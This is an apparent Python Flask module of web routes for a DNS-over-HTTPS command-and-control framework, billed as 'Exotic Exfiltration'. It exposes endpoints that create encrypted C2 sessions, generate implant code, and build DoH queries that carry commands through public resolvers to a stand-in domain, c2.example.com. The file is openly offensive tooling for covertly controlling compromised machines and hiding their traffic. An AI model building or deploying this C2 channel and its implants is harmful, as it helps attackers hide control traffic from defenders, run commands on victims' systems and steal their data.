"""
DNS-over-HTTPS C2 Flask Routes
PRO Module - Exotic Exfiltration
"""

from flask import Blueprint, render_template, request, jsonify
import secrets

bp = Blueprint('doh_c2', __name__, url_prefix='/doh-c2')

# Import the DoH C2 module
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from doh_c2 import DoHC2Channel, DoHProvider, get_doh_channel
except ImportError:
    DoHC2Channel = None
    DoHProvider = None


@bp.route('/')
def index():
    """DoH C2 main page"""
    providers = []
    if DoHProvider:
        providers = [
            {"name": p.name, "display": p.display_name, "url": p.url}
            for p in DoHProvider
        ]
    return render_template('doh_c2.html', providers=providers)


@bp.route('/api/create-session', methods=['POST'])
def create_session():
    """Create new DoH C2 session"""
    try:
        data = request.get_json() or {}
        domain = data.get('domain', 'c2.example.com')
        provider_name = data.get('provider', 'GOOGLE')
        client_id = data.get('client_id', secrets.token_hex(8))
        
        # Get provider
        provider = DoHProvider.GOOGLE
        if DoHProvider:
            try:
                provider = DoHProvider[provider_name]
            except KeyError:
                pass
        
        # Create channel and session
        channel = get_doh_channel(domain, provider)
        
        # Set encryption key if provided
        encryption_key = data.get('encryption_key')
        if encryption_key:
            channel.set_encryption_key(encryption_key.encode())
        else:
            channel.set_encryption_key(secrets.token_bytes(32))
        
        session = channel.create_session(client_id)
        
        return jsonify({
            "success": True,
            "session": session.to_dict(),
            "channel": {
                "domain": channel.domain,
                "provider": channel.provider.display_name,
                "encoding": channel.encoding.value
            }
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@bp.route('/api/generate-implant', methods=['POST'])
def generate_implant():
    """Generate DoH C2 implant code"""
    try:
        data = request.get_json() or {}
        domain = data.get('domain', 'c2.example.com')
        provider_name = data.get('provider', 'GOOGLE')
        language = data.get('language', 'python')
        
        # Get provider
        provider = DoHProvider.GOOGLE
        if DoHProvider:
            try:
                provider = DoHProvider[provider_name]
            except KeyError:
                pass
        
        channel = get_doh_channel(domain, provider)
        channel.set_encryption_key(secrets.token_bytes(32))
        session = channel.create_session()
        
        implant_code = channel.generate_implant_code(session, language)
        
        return jsonify({
            "success": True,
            "language": language,
            "code": implant_code,
            "session_id": session.session_id[:16]
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@bp.route('/api/build-query', methods=['POST'])
def build_query():
    """Build a sample DNS query for demonstration"""
    try:
        data = request.get_json() or {}
        domain = data.get('domain', 'c2.example.com')
        payload = data.get('payload', 'test command')
        
        channel = get_doh_channel(domain)
        channel.set_encryption_key(secrets.token_bytes(32))
        session = channel.create_session()
        
        from doh_c2 import DoHMessage
        message = DoHMessage(
            message_id=secrets.token_hex(8),
            message_type="cmd",
            payload=payload.encode()
        )
        
        query = channel.build_dns_query(message)
        doh_request = channel.build_doh_request(query)
        
        return jsonify({
            "success": True,
            "query_domain": query,
            "doh_url": doh_request["url"],
            "content_type": doh_request["headers"]["Content-Type"],
            "message_id": message.message_id
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@bp.route('/api/statistics')
def get_statistics():
    """Get DoH C2 statistics"""
    try:
        channel = get_doh_channel()
        stats = channel.get_statistics()
        return jsonify({"success": True, "statistics": stats})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@bp.route('/api/providers')
def list_providers():
    """List available DoH providers"""
    providers = []
    if DoHProvider:
        providers = [
            {
                "name": p.name,
                "display_name": p.display_name,
                "url": p.url
            }
            for p in DoHProvider
        ]
    return jsonify({"success": True, "providers": providers})
